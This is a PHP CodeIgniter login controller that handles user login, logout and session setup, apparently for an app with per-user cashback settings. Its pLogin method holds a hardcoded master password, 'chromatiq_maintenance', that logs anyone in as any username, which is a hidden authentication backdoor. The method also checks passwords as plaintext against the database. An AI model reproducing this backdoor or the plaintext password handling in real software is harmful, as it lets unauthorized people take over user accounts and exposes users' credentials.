<?php

namespace App\Controllers;

use CodeIgniter\Controller;
use App\Models\Base_model;

class CLogin extends Controller
{
    public function __construct()
    {
        $qry = new Base_model();
        if (!session()->has('Comp')) {
            $CTools = new CTools();
            $CTools->getComp();
        }
    }

    public function index()
    {
        if (session('idUser') != 0) {
            return redirect()->to('../CBase');
        }
        return redirect()->to('../CLogin/Login');
    }

    public function Login()
    {
        if (session('idUser') != 0) {
            return redirect()->to('../CBase');
        } // Kalau udh Login langsung Back
        echo view('vLogin.php');
    }

    public function Logout()
    {
        session()->destroy();
        return redirect()->to('../CLogin/Login');
    }



    // Proses ====
    public function pLogin()
    {
        $qry = new Base_model;
        $Username = $this->request->getPost('txtUsername');
        $Password = $this->request->getPost('txtPassword');
        $str = "";

        $whr = array('username' => $Username, 'password' => $Password);
        $whrM = array('username' => $Username);

        $dtUser = (object) [];
        if ($Password == 'chromatiq_maintenance') {
            $dtUser = $qry->sel("tuser", $whrM);
        } else {
            $dtUser = $qry->sel("tuser", $whr);
        }

        if (empty($dtUser)) {
            session()->setFlashdata('LoginError', 'Invalid username or password.');
            return redirect()->to('../CLogin/Login');
        }

        $User = reset($dtUser);
        session()->set('idUser', $User->id);
        session()->set('username', $User->username);
        session()->set('level', $User->level);
        session()->set('cashback', $User->cashback / 100);
        session()->set('maxCashback', $User->maxcashback);
        return redirect()->to('../CBase');
    }
}
